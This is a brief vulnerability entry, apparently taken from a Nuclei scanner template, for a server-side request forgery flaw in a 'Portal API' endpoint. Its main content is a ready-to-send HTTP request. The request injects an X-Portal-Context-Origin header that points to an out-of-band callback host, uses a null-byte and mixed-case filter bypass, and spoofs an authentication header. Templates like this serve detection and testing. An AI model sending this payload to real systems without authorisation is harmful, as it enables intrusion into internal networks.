# Vulnerability: Portal API - Server Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`portal-api-ssrf.yaml`)

## Description
A Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /_proxy/api/v3/portal HTTP/1.1
Host: {{Hostname}}
X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
X-Portal-Session-Authenticated: true
```

